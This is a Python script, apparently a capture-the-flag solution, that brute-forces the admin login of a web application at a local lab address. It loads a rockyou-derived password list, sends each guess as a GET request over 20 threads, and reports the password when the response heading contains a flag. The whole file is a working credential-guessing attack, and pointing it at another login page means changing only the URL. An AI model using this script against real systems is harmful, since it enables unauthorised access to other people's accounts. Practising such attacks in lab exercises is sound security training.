#! /usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import concurrent.futures
import time

passwords = []

file = open('rockyou-50.txt', 'r')
for line in file.readlines():
    passwords.append(line[:-1])
file.close()

def test_password(password):
    print("test with '%s'" % password)
    ret = requests.get('http://192.168.1.48/?page=signin&username=admin&password=%s&Login=Login' % password)
    soup = BeautifulSoup(ret.text, 'html.parser')
    if "flag" in soup.find('h2').text:
        return soup.find('h2').text
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        r = {executor.submit(test_password, p): p for p in passwords}
        for future in concurrent.futures.as_completed(r):
            if future.result():
                executor.shutdown(wait=False)
                concurrent.futures.thread._threads_queues.clear()
                executor._threads.clear()
                time.sleep(1)
                print("found! password is '%s'" % r[future])
                print(future.result())
                break
